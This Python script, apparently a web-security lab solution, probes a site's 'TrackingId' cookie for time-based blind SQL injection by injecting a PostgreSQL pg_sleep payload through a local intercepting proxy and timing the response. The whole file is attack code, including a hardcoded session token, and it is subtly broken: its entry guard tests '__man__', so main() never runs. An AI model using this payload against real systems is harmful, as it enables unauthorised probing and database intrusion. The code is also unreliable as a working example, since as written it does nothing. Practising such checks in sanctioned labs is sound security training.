import sys
import requests
import urllib3
import urllib

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'oa73E0SmTETtXLjq' + sqli_payload_encoded,
               'session': 'j9y637nsxYnG3Sf5N0pPJtpEd50Q72na'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        print("(+) Vulnerable to Blind based SQL injection")
    else:
        print("(-) Not vulnerable to Blind based SQL Injection ")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Checking if tracking cookie is vulerable to blind sql injection... ")
    blind_sqli_check(url)


if __name__ == "__man__":
    main()
